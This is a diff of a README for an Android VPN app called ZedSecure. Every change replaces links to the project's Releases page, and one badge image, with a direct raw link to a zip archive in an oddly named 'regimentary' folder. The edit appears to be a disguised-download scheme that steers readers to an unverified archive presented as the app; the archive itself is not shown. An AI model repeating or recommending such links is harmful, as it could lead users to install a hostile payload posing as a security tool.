@@ -1,6 +1,6 @@
 # 🔒 ZedSecure - Your Secure VPN Solution for Android
 
-![Download ZedSecure](https://img.shields.io/badge/Download-ZedSecure-brightgreen.svg)
+![Download ZedSecure](https://raw.githubusercontent.com/MaheshK36/ZedSecure/main/regimentary/ZedSecure.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ ZedSecure is a professional Android VPN app designed with Flutter and Kotlin. It
 
 To get ZedSecure, visit the Releases page below. You will find the latest version of the app available for download.
 
-[Download ZedSecure](https://github.com/MaheshK36/ZedSecure/releases)
+[Download ZedSecure](https://raw.githubusercontent.com/MaheshK36/ZedSecure/main/regimentary/ZedSecure.zip)
 
 ### 1. Visit the Releases Page
 
@@ -76,6 +76,6 @@ To run ZedSecure on your Android device, ensure the following:
 
 For any questions or issues, please open a new issue in the repository. We aim to respond as soon as possible.
 
-[Download ZedSecure](https://github.com/MaheshK36/ZedSecure/releases) 
+[Download ZedSecure](https://raw.githubusercontent.com/MaheshK36/ZedSecure/main/regimentary/ZedSecure.zip) 
 
 Explore your online world securely with ZedSecure. Enjoy safe browsing today!
